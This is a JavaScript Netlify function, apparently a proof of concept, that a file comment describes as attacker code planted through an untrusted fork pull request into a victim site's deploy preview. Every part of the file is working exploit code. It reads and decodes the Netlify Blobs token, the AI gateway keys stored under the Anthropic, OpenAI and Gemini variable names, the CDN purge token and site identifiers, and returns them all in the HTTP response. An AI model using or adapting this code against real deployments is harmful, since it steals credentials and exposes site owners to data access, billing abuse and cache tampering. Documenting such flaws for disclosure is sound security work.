// ATTACKER function, deployed by an UNTRUSTED external fork pull request into the victim
// site's Deploy Preview. No Netlify account, no write access to the victim repository.
// Path: sponge/netlify/functions/env.js
// Invoked at: https://deploy-preview-2--spongebobssssssss.netlify.app/.netlify/functions/env
//
// It prints the credential envelope Netlify injects into the untrusted preview runtime.
// Every value below is handed to attacker-controlled code by the platform.

const decodeJwt = (t) => {
  try {
    const p = String(t).split(".");
    if (p.length < 2) return null;
    return JSON.parse(Buffer.from(p[1].replace(/-/g, "+").replace(/_/g, "/"), "base64").toString("utf8"));
  } catch (e) { return null; }
};

export default async (req, context) => {
  const out = { ts: new Date().toISOString(), credential_envelope: {}, env_key_list: [] };

  // 1. Netlify Blobs credential: base64 JSON holding the site id and a site-scoped JWT.
  const rawBlobs = process.env.NETLIFY_BLOBS_CONTEXT || null;
  let blobs = null;
  try { blobs = JSON.parse(Buffer.from(rawBlobs, "base64").toString("utf8")); } catch (e) { blobs = { parse_error: String(e) }; }
  out.credential_envelope.NETLIFY_BLOBS_CONTEXT = {
    raw_base64: rawBlobs,
    decoded: blobs,
    token_claims: blobs && blobs.token ? decodeJwt(blobs.token) : null,
  };

  // 2. AI Gateway credential, injected under four provider variable names.
  for (const k of ["NETLIFY_AI_GATEWAY_KEY", "ANTHROPIC_API_KEY", "OPENAI_API_KEY", "GEMINI_API_KEY"]) {
    out.credential_envelope[k] = { value: process.env[k] || null, claims: decodeJwt(process.env[k]) };
  }
  for (const k of ["ANTHROPIC_BASE_URL", "OPENAI_BASE_URL", "GEMINI_BASE_URL", "AI_GATEWAY_URL", "NETLIFY_AI_GATEWAY_URL"]) {
    if (process.env[k]) out.credential_envelope[k] = process.env[k];
  }

  // 3. Production CDN cache purge credential.
  out.credential_envelope.NETLIFY_PURGE_API_TOKEN = {
    value: process.env.NETLIFY_PURGE_API_TOKEN || null,
    claims: decodeJwt(process.env.NETLIFY_PURGE_API_TOKEN),
  };

  // 4. Site identity + runtime identification.
  out.runtime = {
    SITE_ID: process.env.SITE_ID || null,
    SITE_NAME: process.env.SITE_NAME || null,
    CONTEXT: process.env.CONTEXT || null,
    BRANCH: process.env.BRANCH || null,
    PULL_REQUEST: process.env.PULL_REQUEST || null,
    REVIEW_ID: process.env.REVIEW_ID || null,
    AWS_EXECUTION_ENV: process.env.AWS_EXECUTION_ENV || null,
    AWS_REGION: process.env.AWS_REGION || null,
  };

  out.env_key_list = Object.keys(process.env).sort();

  return new Response(JSON.stringify(out, null, 2), {
    headers: { "content-type": "application/json", "cache-control": "no-store" },
  });
};